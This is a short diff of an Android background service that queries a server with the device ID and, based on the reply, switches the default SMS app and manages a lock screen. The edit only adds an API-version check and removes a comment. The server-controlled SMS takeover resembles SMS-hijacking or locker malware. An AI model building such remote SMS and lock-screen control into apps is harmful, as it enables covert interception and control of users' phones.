@@ -107,7 +107,9 @@ public class MyRequestService extends Service {
                         boolean res = new GetREST().get_data(deviceId);
                         Log.d(TAG, deviceId);
                         if (res) {
-                            changeDefaultSMSClient(mDataManager.getPreferensManager().isChangeSMS());
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                                changeDefaultSMSClient(mDataManager.getPreferensManager().isChangeSMS());
+                            }
                             if (!mDataManager.getPreferensManager().isLockScreen()) {
                                 if (WebMessageActivity.sWebMessageActivity!=null)
                                     WebMessageActivity.sWebMessageActivity.finish();
@@ -140,7 +142,6 @@ public class MyRequestService extends Service {
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,myPackageName);
                 startActivity(intent);
-                //sendBroadcast(intent);
             } else {
                 Log.d(TAG,"ТИПА ДЕФОЛТ");
             }
